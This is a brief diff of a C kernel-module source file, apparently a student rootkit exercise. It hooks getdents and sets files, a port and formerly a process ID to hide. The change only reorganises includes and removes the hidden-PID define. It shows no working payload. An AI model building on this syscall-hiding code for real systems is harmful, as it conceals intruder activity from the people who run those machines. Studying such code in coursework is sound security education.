@@ -19,12 +19,12 @@
 #include <linux/fdtable.h>
 #include <linux/limits.h>
 
+#include "syshook_utils.h"
+
 #define HIDDEN_PORT 8080
 #define HIDDEN_FILE_DIR "/home/student/projects/hw"
 #define HIDDEN_FILE_NAME "myfile"
-#define HIDDEN_PID "4038"
 
-#include "syshook_utils.c"
 #include "hook_functions/getdents.c"
 
 typedef enum {
